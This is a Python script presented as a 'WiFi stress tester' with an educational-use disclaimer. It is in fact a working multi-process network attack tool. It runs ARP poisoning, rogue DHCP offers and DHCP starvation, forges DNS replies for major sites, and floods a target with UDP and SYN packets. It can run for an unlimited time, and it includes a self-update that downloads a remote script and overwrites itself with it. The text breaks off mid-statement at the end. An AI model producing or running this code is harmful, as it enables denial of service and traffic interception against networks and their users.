# WiFi Stress Tester v2.0.0
# FOR EDUCATIONAL PURPOSES ONLY - I AM NOT RESPONSIBLE FOR ANY MISUSE
# Devs: tg: @oeuts & @One_mIZa
import os, re, sys, time, socket, random, struct, threading, subprocess, multiprocessing, collections, json, select
from pathlib import Path
from urllib.request import urlopen
from urllib.error import URLError, HTTPError

try:
    from rich.console import Console
    from rich.live import Live
    from rich.table import Table
    from rich.panel import Panel
except ImportError:
    print("Please install required packages: pip install rich")
    sys.exit(1)

cfg = {
    'GH_RAW': "https://raw.githubusercontent.com/vareblades/stress-test/main/",
    'SCRIPT_FILE': "wifi-tester.py",
    'MENU_OPTIONS': ["", "0"],
    'DEF_IP': "192.168.1.1",
    'CURRENT_VER': "2.0.0",
    'CHECK_UPDATES': True
}

RAINBOW_COLORS = [
    "[bold #FF0000]", "[bold #FF4500]", "[bold #FFA500]", "[bold #FFFF00]",
    "[bold #9ACD32]", "[bold #00FF00]", "[bold #00FFFF]", "[bold #1E90FF]",
    "[bold #0000FF]", "[bold #8A2BE2]", "[bold #FF00FF]", "[bold #FF1493]"
]

console = Console()

class RainbowSkull:
    def __init__(self):
        self.full_skull = """                            ,--.
                           {    }
                           m,   }
                          /  ~I`
                     ,   /   /
                    {_'-Z.__/
                      `/-.__L._
                      /  ' /`a_}
                     /  ' /
             ____   /  ' /
      ,-'~~~~    ~~/  ' /_
    ,'             ``~~~  ',
   (                        m
  {                         I
 {      -                    `,
 |       ',                   )
 |        |   ,..__      __. Z
 |    .,,./  Y ' / ^Y   J   )|
 \\           |' /   |   |a  ||
  \\          L_/    . _ (_,.'(
   \\,   ,      ^^""' / |      )
     \\_  \\          /,L]     /
       '-_~-,       ` `   ./`
          `'{_            )
              ^^\\..__,.--`    """
    
    def get_rainbow_skull(self):
        color_index = int(time.time() * 14)
        color = RAINBOW_COLORS[color_index % len(RAINBOW_COLORS)]
        return f"{color}{self.full_skull}[/]"
    
    def get_red_skull(self):
        return f"[bold #FF0000]{self.full_skull}[/]"
    
    def get_yellow_skull(self):
        return f"[bold yellow]{self.full_skull}[/]"

def draw_ui(right_text="", rainbow=False, static_yellow=False):
    os.system('clear' if os.name == 'posix' else 'cls')
    console.print(f"\n\n[bold cyan]{' '*40}NETWORK LOAD TESTER v{cfg['CURRENT_VER']}[/]\n")
    
    table = Table.grid(expand=False, padding=(0, 5))
    table.add_column(justify="left", no_wrap=True)
    table.add_column(justify="left", no_wrap=True)
    
    skull = RainbowSkull()
    if static_yellow:
        skull_art = skull.get_yellow_skull()
    else:
        skull_art = skull.get_rainbow_skull() if rainbow else skull.get_red_skull()
    
    table.add_row(skull_art, right_text)
    console.print(table)

def get_gateway():
    default_ip = "192.168.1.1"
    try:
        if sys.platform in ["linux", "linux2"]:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=1)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == 'via' and i + 1 < len(parts):
                            return parts[i + 1]
        return default_ip
    except:
        return default_ip

cfg['DEF_IP'] = get_gateway()

def check_for_updates():
    if not cfg['CHECK_UPDATES']:
        return None
    
    try:
        script_url = f"{cfg['GH_RAW']}{cfg['SCRIPT_FILE']}"
        with urlopen(script_url, timeout=10) as response:
            content = response.read().decode()
        
        version_match = re.search(r"'CURRENT_VER':\s*[\"']([\d.]+)[\"']", content)
        if version_match:
            latest_version = version_match.group(1)
            if latest_version != cfg['CURRENT_VER']:
                return latest_version
    except (URLError, HTTPError, TimeoutError):
        pass
    except Exception:
        pass
    
    return None

def show_update_dialog(latest_version):
    os.system('clear' if os.name == 'posix' else 'cls')
    console.print(f"\n\n[bold cyan]{' '*40}NETWORK LOAD TESTER v{cfg['CURRENT_VER']}[/]\n")
    
    skull = RainbowSkull()
    skull_art = skull.get_yellow_skull()
    
    update_text = f"""[bold yellow]🔥 UPDATE AVAILABLE! 🔥[/bold yellow]

[white]Current version:[/white] [red]v{cfg['CURRENT_VER']}[/red]
[white]Latest version:[/white] [green]v{latest_version}[/green]

[bold cyan]Do you want to update now?[/bold cyan]
[green][Y][/green] Yes - Update and restart
[yellow][N][/yellow] No - Continue with current version

[white]Press [bold]Y[/bold] to update, any other key to continue...[/white]"""
    
    table = Table.grid(expand=False, padding=(0, 5))
    table.add_column(justify="left", no_wrap=True)
    table.add_column(justify="left", no_wrap=True)
    table.add_row(skull_art, update_text)
    
    console.print(table)
    
    choice = console.input("\n[bold yellow]Your choice: [/bold yellow]").strip().upper()
    return choice == 'Y'

def update_script():
    try:
        script_url = f"{cfg['GH_RAW']}{cfg['SCRIPT_FILE']}"
        with urlopen(script_url, timeout=10) as response:
            new_content = response.read().decode()
        
        current_file = sys.argv[0]
        current_path = Path(current_file)
        
        if not current_file.endswith('.py'):
            current_file = current_path.name
            backup_file = f"{current_file}.backup"
        else:
            backup_file = f"{current_path.stem}.backup.py"
        
        try:
            with open(current_file, 'r') as f:
                current_content = f.read()
        except:
            current_file = current_path.name
            with open(current_file, 'r') as f:
                current_content = f.read()
        
        with open(backup_file, 'w') as f:
            f.write(current_content)
        
        with open(current_file, 'w') as f:
            f.write(new_content)
        
        draw_ui(f"""[bold green]✅ UPDATE SUCCESSFUL![/bold green]

[white]Script has been updated to latest version[/white]
[white]Backup saved as:[/white] [yellow]{backup_file}[/yellow]

[bold cyan]Restarting script...[/bold cyan]
[white]Please wait...[/white]""", rainbow=False, static_yellow=True)
        
        time.sleep(3)
        return True
    except Exception as e:
        draw_ui(f"""[bold red]❌ UPDATE FAILED![/bold red]

[white]Error:[/white] [red]{str(e)}[/red]
[white]Continuing with current version...[/white]""", rainbow=False, static_yellow=True)
        
        time.sleep(3)
        return False

def get_input(prompt):
    draw_ui(prompt, rainbow=False)
    return console.input("").strip()

def get_cores():
    max_cores = multiprocessing.cpu_count()
    default_cores = max(1, max_cores // 2)
    
    while True:
        try:
            cores_str = get_input(f"[yellow]CPU Cores [1-{max_cores}] (default {default_cores}):[/yellow]\n[bold cyan][B][/bold cyan] Back")
            if cores_str.lower() == "b":
                return "back"
            if not cores_str:
                return default_cores
            cores = int(cores_str)
            if cores == 0:
                sys.exit(1)
            if 1 <= cores <= max_cores:
                return cores
        except ValueError:
            pass
        except KeyboardInterrupt:
            console.print("\n[yellow]Exiting...[/yellow]")
            sys.exit(0)

def get_target(previous_cores):
    while True:
        try:
            ip = get_input(f"[yellow]Target IP [{cfg['DEF_IP']}]:[/yellow]\n[bold cyan][B][/bold cyan] Back to CPU selection")
            if ip.lower() == "b":
                return "back", previous_cores
            if not ip:
                ip = cfg['DEF_IP']
            if check_ip(ip):
                return ip, previous_cores
            else:
                draw_ui("[red]Invalid IP format[/red]", rainbow=False)
                time.sleep(0.5)
        except KeyboardInterrupt:
            console.print("\n[yellow]Exiting...[/yellow]")
            sys.exit(0)

def check_ip(ip: str):
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except:
        return False

def get_duration(previous_target, previous_cores):
    while True:
        try:
            dur_str = get_input(f"""[yellow]Test Duration [seconds]:[/yellow]
Enter - 300 seconds (default)
0 - Infinite attack
1-9999 - Set specific time
[bold cyan][B][/bold cyan] Back to IP selection""")
            if dur_str.lower() == "b":
                return "back", previous_target, previous_cores
            if not dur_str:
                return 300, previous_target, previous_cores
            if dur_str == "0":
                return 999999999, previous_target, previous_cores
            duration = int(dur_str)
            if 1 <= duration <= 9999:
                return duration, previous_target, previous_cores
        except ValueError:
            draw_ui("[red]Invalid duration[/red]", rainbow=False)
            time.sleep(0.5)
        except KeyboardInterrupt:
            console.print("\n[yellow]Exiting...[/yellow]")
            sys.exit(0)

class NetworkLoadTester:
    def __init__(self, target_ip, duration, test_threads):
        self.target = target_ip
        self.duration = duration
        self.running = True
        self.test_threads = test_threads
        
        self.shared_stats = multiprocessing.Value('i', 0)
        self.shared_bytes = multiprocessing.Value('i', 0)
        self.ping_stats = multiprocessing.Value('d', 9999.0)
        self.open_ports = multiprocessing.Value('i', 0)
        self.start_time = time.time()
        
        self.stats_queue = multiprocessing.Queue()
        self.stats_process = multiprocessing.Process(target=self._stats_collector)
        self.stats_process.daemon = True
        self.stats_process.start()
        
        self.ping_process = multiprocessing.Process(target=self._ping_monitor)
        self.ping_process.daemon = True
        self.ping_process.start()
        
        self.port_scan_process = multiprocessing.Process(target=self._port_scan_monitor)
        self.port_scan_process.daemon = True
        self.port_scan_process.start()
        
        self.buffer_cache = []
        for _ in range(100):
            size = random.randint(500, 1472)
            self.buffer_cache.append(os.urandom(size))
    
    def _stats_collector(self):
        packets = 0
        bytes_sent = 0
        packet_times = collections.deque(maxlen=10000)
        byte_times = collections.deque(maxlen=10000)
        
        while self.running:
            try:
                if not self.stats_queue.empty():
                    p, b = self.stats_queue.get_nowait()
                    packets += p
                    bytes_sent += b
                    packet_times.append((time.time(), p))
                    byte_times.append((time.time(), b))
                
                now = time.time()
                pps = sum(count for t, count in packet_times if now - t <= 1.0)
                bps = sum(bytes_count for t, bytes_count in byte_times if now - t <= 1.0)
                
                with self.shared_stats.get_lock():
                    self.shared_stats.value = pps
                with self.shared_bytes.get_lock():
                    self.shared_bytes.value = bps
                
                time.sleep(0.05)
            except:
                pass
    
    def _ping_monitor(self):
        import select
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(1)
                
                packet_id = random.randint(0, 0xFFFF)
                packet_seq = 1
                
                icmp_header = struct.pack("!BBHHH", 8, 0, 0, packet_id, packet_seq)
                data = b"PINGTEST" * 8
                checksum = 0
                
                for i in range(0, len(icmp_header), 2):
                    checksum += (icmp_header[i] << 8) + icmp_header[i+1]
                
                for i in range(0, len(data), 2):
                    if i+1 < len(data):
                        checksum += (data[i] << 8) + data[i+1]
                    else:
                        checksum += data[i] << 8
                
                checksum = (checksum >> 16) + (checksum & 0xFFFF)
                checksum = ~checksum & 0xFFFF
                
                icmp_header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, packet_seq)
                packet = icmp_header + data
                
                start_time = time.time()
                sock.sendto(packet, (self.target, 0))
                
                ready = select.select([sock], [], [], 1)
                if ready[0]:
                    response, addr = sock.recvfrom(1024)
                    rtt = (time.time() - start_time) * 1000
                    with self.ping_stats.get_lock():
                        self.ping_stats.value = rtt
                else:
                    with self.ping_stats.get_lock():
                        self.ping_stats.value = 9999.0
                
                sock.close()
                time.sleep(2)
                
            except:
                with self.ping_stats.get_lock():
                    self.ping_stats.value = 9999.0
                time.sleep(2)
    
    def _port_scan_monitor(self):
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        while self.running:
            try:
                open_count = 0
                
                for port in common_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((self.target, port))
                        if result == 0:
                            open_count += 1
                        sock.close()
                    except:
                        pass
                
                with self.open_ports.get_lock():
                    self.open_ports.value = open_count
                
                time.sleep(5)
                
            except:
                with self.open_ports.get_lock():
                    self.open_ports.value = 0
                time.sleep(5)
    
    def arp_poisoning_attack(self):
        try:
            target_parts = self.target.split('.')
            target_base = '.'.join(target_parts[:3])
            
            start_time = time.time()
            packets_sent = 0
            bytes_sent = 0
            last_stats_time = time.time()
            
            while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
                try:
                    my_mac = ':'.join(['{:02x}'.format(random.randint(0x00, 0xff)) for _ in range(6)])
                    
                    for i in range(1, 255):
                        victim_ip = f"{target_base}.{i}"
                        
                        arp_request = struct.pack('!6s6sH', 
                                                  b'\xff\xff\xff\xff\xff\xff',
                                                  bytes.fromhex(my_mac.replace(':', '')),
                                                  0x0806)
                        
                        arp_request += struct.pack('HHBBH', 
                                                   0x0001, 0x0800, 6, 4, 0x0001)
                        
                        arp_request += bytes.fromhex(my_mac.replace(':', ''))
                        arp_request += socket.inet_aton('0.0.0.0')
                        
                        victim_mac = bytes([random.randint(0x00, 0xff) for _ in range(6)])
                        arp_request += victim_mac
                        arp_request += socket.inet_aton(victim_ip)
                        
                        arp_reply = struct.pack('!6s6sH', 
                                                victim_mac,
                                                bytes.fromhex(my_mac.replace(':', '')),
                                                0x0806)
                        
                        arp_reply += struct.pack('HHBBH', 
                                                 0x0001, 0x0800, 6, 4, 0x0002)
                        
                        arp_reply += bytes.fromhex(my_mac.replace(':', ''))
                        arp_reply += socket.inet_aton(self.target)
                        arp_reply += victim_mac
                        arp_reply += socket.inet_aton(victim_ip)
                        
                        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806)) as sock:
                            sock.bind(('eth0', 0))
                            sock.send(arp_request)
                            sock.send(arp_reply)
                        
                        packets_sent += 2
                        bytes_sent += len(arp_request) + len(arp_reply)
                    
                    now = time.time()
                    if now - last_stats_time >= 0.1:
                        try:
                            self.stats_queue.put_nowait((packets_sent, bytes_sent))
                        except:
                            pass
                        packets_sent = 0
                        bytes_sent = 0
                        last_stats_time = now
                        
                except:
                    pass
                
                time.sleep(0.01)
        except:
            pass
    
    def dhcp_spoofing_attack(self):
        try:
            start_time = time.time()
            packets_sent = 0
            bytes_sent = 0
            last_stats_time = time.time()
            
            while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
                try:
                    my_mac = ':'.join(['{:02x}'.format(random.randint(0x00, 0xff)) for _ in range(6)])
                    fake_dhcp_server = f"192.168.{random.randint(1, 254)}.{random.randint(2, 254)}"
                    
                    dhcp_offer = struct.pack('!BBBBLHHLLLL',
                                             0x02, 0x01, 0x06, 0x00,
                                             random.randint(0, 0xFFFFFFFF),
                                             0x0000, 0x0000,
                                             0x00000000,
                                             socket.inet_aton(fake_dhcp_server),
                                             socket.inet_aton(fake_dhcp_server),
                                             socket.inet_aton('255.255.255.0'))
                    
                    dhcp_offer += bytes([random.randint(0x00, 0xff) for _ in range(6)]) * 10
                    dhcp_offer += b'\x63\x82\x53\x63'
                    dhcp_offer += struct.pack('BB', 0x35, 0x01) + b'\x02'
                    dhcp_offer += struct.pack('BB', 0x36, 0x04) + socket.inet_aton(fake_dhcp_server)
                    dhcp_offer += struct.pack('BB', 0x33, 0x04) + struct.pack('!L', 600)
                    dhcp_offer += struct.pack('BB', 0x01, 0x04) + socket.inet_aton('255.255.255.0')
                    dhcp_offer += struct.pack('BB', 0x03, 0x04) + socket.inet_aton(fake_dhcp_server)
                    dhcp_offer += struct.pack('BB', 0x06, 0x08) + socket.inet_aton('8.8.8.8') + socket.inet_aton('8.8.4.4')
                    dhcp_offer += b'\xff'
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    sock.sendto(dhcp_offer, ('255.255.255.255', 68))
                    sock.close()
                    
                    packets_sent += 1
                    bytes_sent += len(dhcp_offer)
                    
                    now = time.time()
                    if now - last_stats_time >= 0.1:
                        try:
                            self.stats_queue.put_nowait((packets_sent, bytes_sent))
                        except:
                            pass
                        packets_sent = 0
                        bytes_sent = 0
                        last_stats_time = now
                        
                except:
                    pass
                
                time.sleep(0.05)
        except:
            pass
    
    def dns_cache_poisoning_attack(self):
        try:
            start_time = time.time()
            packets_sent = 0
            bytes_sent = 0
            last_stats_time = time.time()
            
            domains = [
                "google.com", "youtube.com", "facebook.com", "instagram.com",
                "twitter.com", "whatsapp.com", "amazon.com", "netflix.com",
                "microsoft.com", "apple.com", "github.com", "stackoverflow.com"
            ]
            
            while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
                try:
                    transaction_id = random.randint(0, 65535)
                    domain = random.choice(domains)
                    
                    dns_response = struct.pack('!HHHHHH',
                                               transaction_id,
                                               0x8180,
                                               1, 1, 0, 0)
                    
                    for part in domain.split('.'):
                        dns_response += struct.pack('B', len(part)) + part.encode()
                    dns_response += b'\x00'
                    
                    dns_response += struct.pack('!H', 0x0001)
                    dns_response += struct.pack('!H', 0x0001)
                    dns_response += struct.pack('!L', 300)
                    dns_response += struct.pack('!H', 4)
                    dns_response += socket.inet_aton('127.0.0.1')
                    
                    spoofed_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                    dns_response += struct.pack('!H', 0x0001)
                    dns_response += struct.pack('!H', 0x0001)
                    dns_response += struct.pack('!L', 300)
                    dns_response += struct.pack('!H', 4)
                    dns_response += socket.inet_aton(spoofed_ip)
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(dns_response, (self.target, 53))
                    sock.close()
                    
                    packets_sent += 1
                    bytes_sent += len(dns_response)
                    
                    now = time.time()
                    if now - last_stats_time >= 0.1:
                        try:
                            self.stats_queue.put_nowait((packets_sent, bytes_sent))
                        except:
                            pass
                        packets_sent = 0
                        bytes_sent = 0
                        last_stats_time = now
                        
                except:
                    pass
                
                time.sleep(0.1)
        except:
            pass
    
    def dhcp_flood_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)
        except:
            return
        
        dhcp_packets = []
        for _ in range(50):
            mac = bytes([random.randint(0x00, 0xff) for _ in range(6)])
            packet = b'\x01\x01\x06\x00' + os.urandom(4) + b'\x00\x00\x80\x00'
            packet += b'\x00'*16 + mac + b'\x00'*202
            packet += b'\x63\x82\x53\x63\x35\x01\x01\xff'
            dhcp_packets.append(packet)
        
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        last_stats_time = time.time()
        
        while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
            try:
                for _ in range(50):
                    packet = random.choice(dhcp_packets)
                    sock.sendto(packet, ('255.255.255.255', 67))
                    sock.sendto(packet, (self.target, 67))
                    packets_sent += 2
                    bytes_sent += len(packet) * 2
                
                now = time.time()
                if now - last_stats_time >= 0.1:
                    try:
                        self.stats_queue.put_nowait((packets_sent, bytes_sent))
                    except:
                        pass
                    packets_sent = 0
                    bytes_sent = 0
                    last_stats_time = now
                    
            except:
                pass
        
        try:
            sock.close()
        except:
            pass
    
    def broadcast_udp_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)
        except:
            return
        
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        last_stats_time = time.time()
        
        while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
            try:
                for _ in range(100):
                    payload = random.choice(self.buffer_cache)
                    port = random.randint(1, 65535)
                    sock.sendto(payload, ('255.255.255.255', port))
                    sock.sendto(payload[:100], (self.target, port))
                    packets_sent += 2
                    bytes_sent += (len(payload) + 100)
                
                now = time.time()
                if now - last_stats_time >= 0.1:
                    try:
                        self.stats_queue.put_nowait((packets_sent, bytes_sent))
                    except:
                        pass
                    packets_sent = 0
                    bytes_sent = 0
                    last_stats_time = now
                    
            except:
                pass
        
        try:
            sock.close()
        except:
            pass
    
    def killer_udp(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)
        except:
            return
        
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        last_stats_time = time.time()
        
        while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
            try:
                for _ in range(100):
                    sock.sendto(b'\x00', (self.target, random.randint(1, 65535)))
                    packets_sent += 1
                    bytes_sent += 1
                
                now = time.time()
                if now - last_stats_time >= 0.1:
                    try:
                        self.stats_queue.put_nowait((packets_sent, bytes_sent))
                    except:
                        pass
                    packets_sent = 0
                    bytes_sent = 0
                    last_stats_time = now
                    
            except:
                pass
        
        try:
            sock.close()
        except:
            pass
    
    def syn_killer(self):
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        last_stats_time = time.time()
        
        while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(0)
                sock.settimeout(0.000001)
                sock.connect_ex((self.target, random.randint(1, 65535)))
                sock.close()
                packets_sent += 1
                bytes_sent += 60
                
                now = time.time()
                if now - last_stats_time >= 0.1:
                    try:
                        self.stats_queue.put_nowait((packets_sent, bytes_sent))
                    except:
                        pass
                    packets_sent = 0
                    bytes_sent = 0
                    last_stats_time = now
                    
            except:
                pass
    
    def dns_attack(self):
        domains = [
            '_services._dns-sd._udp.local',
            '_http._tcp.local',
            'isatap.local',
            'wpad.local',
            'router.local',
            'admin.local'
        ]
        
        domain_packets = []
        for domain in domains:
            tid = random.randint(0, 65535)
            packet = struct.pack('>HHHHHH', tid, 0x0100, 1, 0, 0, 0)
            for part in domain.split('.'):
                packet += struct.pack('B', len(part)) + part.encode()
            packet += b'\x00\x00\xff\x00\x01'
            packet += random.choice(self.buffer_cache)[:500]
            domain_packets.append(packet)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)
        except:
            return
        
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        last_stats_time = time.time()
        
        while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
            try:
                for _ in range(50):
                    sock.sendto(random.choice(domain_packets), (self.target, 53))
                    sock.sendto(random.choice(domain_packets), (self.target, 5353))
                    packets_sent += 2
                    bytes_sent += len(domain_packets[0]) * 2
                
                now = time.time()
                if now - last_stats_time >= 0.1:
                    try:
                        self.stats_queue.put_nowait((packets_sent, bytes_sent))
                    except:
                        pass
                    packets_sent = 0
                    bytes_sent = 0
                    last_stats_time = now
                    
            except:
                pass
        
        try:
            sock.close()
        except:
            pass
    
    def get_stats(self):
        with self.shared_stats.get_lock():
            pps = self.shared_stats.value
        with self.shared_bytes.get_lock():
            bps = self.shared_bytes.value
        with self.ping_stats.get_lock():
            ping = self.ping_stats.value
        with self.open_ports.get_lock():
            ports = self.open_ports.value
        
        return pps, bps, ping, ports
    
    def run_tests(self):
        processes = []
        
        for _ in range(self.test_threads):
            p = multiprocessing.Process(target=self.arp_poisoning_attack)
            p.daemon = True
            p.start()
            processes.append(p)
        
        for _ in range(self.test_threads // 2):
            p = multiprocessing.Process(target=self.dhcp_spoofing_attack)
            p.daemon = True
            p.start()
            processes.append(p)
        
        for _ in range(self.test_threads // 2):
            p = multiprocessing.Process(target=self.dns_cache_poisoning_attack)
            p.daemon = True
            p.start()
            processes.append(p)
        
        for _ in range(self.test_threads):
            p = multiprocessing.Process(target=self.dhcp_flood_attack)
            p.daemon = True
            p.start()
            processes.append(p)
        
        for _ in range(self.test_threads):
            p = multiprocessing.Process(target=self.broadcast_udp_attack)
            p.daemon = True
            p.start()
            processes.append(p)
        
        for _ in range(self.test_threads):
            p = multiprocessing.Process(target=self.killer_udp)
            p.daemon = True
            p.start()
            processes.append(p)
        
        for _ in range(self.test_threads // 2):
            p = multiprocessing.Process(target=self.syn_killer)
            p.daemon = True
            p.start()
            processes.append(p)
        
        for _ in range(self.test_threads // 2):
            p = multiprocessing.Process(target=self.dns_attack)
            p.daemon = True
            p.start()
            processes.append(p)
        
        return processes

def menu():
    try:
        latest_version = check_for_updates()
        if latest_version:
            if show_update_dialog(latest_version):
                if update_script():
                    os.execl(sys.executable, sys.executable, *sys.argv)
                else:
                    time.sleep(1)
        
        while True:
            try:
                draw_ui(f"""[bold green][ENTER][/bold green] Start Load Test
[bold red][0][/bold red] Exit""", rainbow=False)
                mainmenu = console.input("").strip()
                if mainmenu in cfg['MENU_OPTIONS']:
                    break
                else:
                    draw_ui("[bold red]Invalid selection[/bold red]", rainbow=False)
                    time.sleep(0.5)
            except KeyboardInterrupt:
                console.print("\n[yellow]Exiting...[/yellow]")
                sys.exit(0)
        
        if mainmenu == "":
            while True:
                CORES = get_cores()
                if CORES == "back":
                    continue
                
                target_ip, CORES = get_target(CORES)
                if target_ip == "back":
                    continue
                
                duration, target_ip, CORES = get_duration(target_ip, CORES)
                if duration == "back":
                    continue
                
                break
            
            duration_text = "Infinite" if duration == 999999999 else f"{duration}s"
            draw_ui(f"""Target: [white]{target_ip}[/]
Duration: [white]{duration_text}[/]
CPU Cores: [white]{CORES}[/]
Processes: [white]{CORES * 8}[/]
[bold cyan][*]STARTING ULTIMATE NETWORK TEST...[/bold cyan]""", rainbow=False)
            time.sleep(1)
            
            tester = NetworkLoadTester(target_ip, duration, CORES)
            processes = tester.run_tests()
            
            start_time = time.time()
            total_packets = 0
            total_bytes = 0
            peak_packets = 0
            peak_bytes = 0
            
            try:
                os.system('clear' if os.name == 'posix' else 'cls')
                console.print(f"\n\n[bold cyan]{' '*40}NETWORK LOAD TESTER v{cfg['CURRENT_VER']}[/]\n")
                with Live(refresh_per_second=14, screen=False) as live:
                    while True:
                        now = time.time()
                        elapsed = now - start_time
                        if duration != 999999999 and elapsed >= duration:
                            break
                        
                        recent_packets, recent_bytes, ping, open_ports = tester.get_stats()
                        total_packets += recent_packets / 14
                        total_bytes += recent_bytes / 14
                        
                        if recent_packets > peak_packets:
                            peak_packets = recent_packets
                        if recent_bytes > peak_bytes:
                            peak_bytes = recent_bytes
                        
                        if duration == 999999999:
                            time_display = f"[white]{int(elapsed)}s/Infinite[/]"
                            progress_bar = "[bold cyan]INFINITE TEST[/]"
                            progress_text = ""
                        else:
                            progress = min(elapsed / duration, 1.0) if duration > 0 else 0
                            bar_len = 20
                            filled = int(bar_len * progress)
                            progress_bar = '█' * filled + '░' * (bar_len - filled)
                            progress_text = f"{progress:.1%}"
                            time_display = f"[white]{int(elapsed)}s/{duration}s[/]"
                        
                        pps_color = "white"
                        if recent_packets >= 10000:
                            pps_color = "green"
                        if recent_packets >= 50000:
                            pps_color = "yellow"
                        if recent_packets >= 100000:
                            pps_color = "red"
                        if recent_packets >= 500000:
                            pps_color = "bold red"
                        if recent_packets >= 1000000:
                            pps_color = "bold #FF00FF"
                        
                        bps_color = "white"
                        mbps = recent_bytes * 8 / 1_000_000
                        if mbps >= 10:
                            bps_color = "green"
                        if mbps >= 50:
                            bps_color = "yellow"
                        if mbps >= 100:
                            bps_color = "red"
                        if mbps >= 500:
                            bps_color = "bold red"
                        if mbps >= 1000:
                            bps_color = "bold #FF00FF"
                        
                        ping_color = "green"
                        if ping >= 100:
                            ping_color = "yellow"
                        if ping >= 300:
                            ping_color = "red"
                        if ping >= 1000:
                            ping_color = "bold red"
                        if ping >= 5000:
                            ping_color = "bold #FF0000"
                        
                        ping_text = f"{ping:.0f} ms" if ping < 9999 else "TIMEOUT"
                        
                        ports_color = "green" if open_ports > 0 else "red"
                        
                        current_time = time.time()
                        color_index = int(current_time * 14) % len(RAINBOW_COLORS)
                        rainbow_color = RAINBOW_COLORS[color_index]
                        
                        test_text = f"""{rainbow_color}[*]ULTIMATE NETWORK TEST ACTIVE[*][/]
{rainbow_color}Target:[/] [bold yellow]{target_ip}[/]
{rainbow_color}Packets:[/] [bold white]{int(total_packets):,}[/]
{rainbow_color}Data:[/] [bold white]{total_bytes / 1_000_000:.3f} MB[/]
{rainbow_color}Rate:[/] [{pps_color}]{recent_packets:,}/s[/]
{rainbow_color}Speed:[/] [{bps_color}]{mbps:.1f} Mbps[/]
{rainbow_color}Ping:[/] [{ping_color}]{ping_text}[/]
{rainbow_color}Open Ports:[/] [{ports_color}]{open_ports}/18[/]
{rainbow_color}Cores:[/] [white]{CORES}[/]
{rainbow_color}Processes:[/] [white]{CORES * 8}[/]
{rainbow_color}Time:[/] {time_display}
{rainbow_color}{progress_bar}[/] {progress_text}
[bold cyan]CTRL+C TO STOP[/bold cyan]"""
                        
                        table = Table.grid(expand=False, padding=(0, 5))
                        table.add_column(justify="left", no_wrap=True)
                        table.add_column(justify="left", no_wrap=True)
                        
                        skull = RainbowSkull()
                        skull_art = skull.get_rainbow_skull()
                        table.add_row(skull_art, test_text)
                        
                        live.update(table)
                        time.sleep(1 / 14)
            except KeyboardInterrupt:
                pass
            finally:
                tester.running = False
                time.sleep(0.5)
                
                for p in processes:
                    try:
                        p.terminate()
                    except:
                        pass
                
                total_time = time.time() - start_time
                avg_pps = total_packets / total_time if total_time > 0 else 0
                avg_mbps = total_bytes * 8 / total_time / 1_000_000 if total_time > 0 else 0
                test_status = "STOPPED" if duration == 999999999 else "COMPLETE"
                
                for seconds_remaining in range(5, 0, -1):
                    stats_text = f"""[bold green]{test_status}[/bold green]
Target: [yellow]{target_ip}[/]
Total Packets: [bold white]{int(total_packets):,}[/]
Total Data: [bold white]{total_bytes / 1_000_000:.3f} MB[/]
Test Time: [white]{total_time:.1f}s[/]
Average Rate: [white]{avg_pps:,.0f}/s[/]
Average Speed: [white]{avg_mbps:.1f} Mbps[/]
Peak Rate (1s): [yellow]{peak_packets:,}/s[/]
Peak Speed (1s): [yellow]{peak_bytes * 8 / 1_000_000:.1f} Mbps[/]
[bold cyan]Menu in {seconds_remaining}s...[/bold cyan]"""
                    draw_ui(stats_text, rainbow=False)
                    time.sleep(1)
                menu()
        
        if mainmenu == "0":
            draw_ui("[bold red]EXITING...[/bold red]", rainbow=False)
            sys.exit(0)
    
    except KeyboardInterrupt:
        console.print("\n[yellow]TEST STOPPED[/yellow]")
        sys.exit(0)
    except Exception as e:
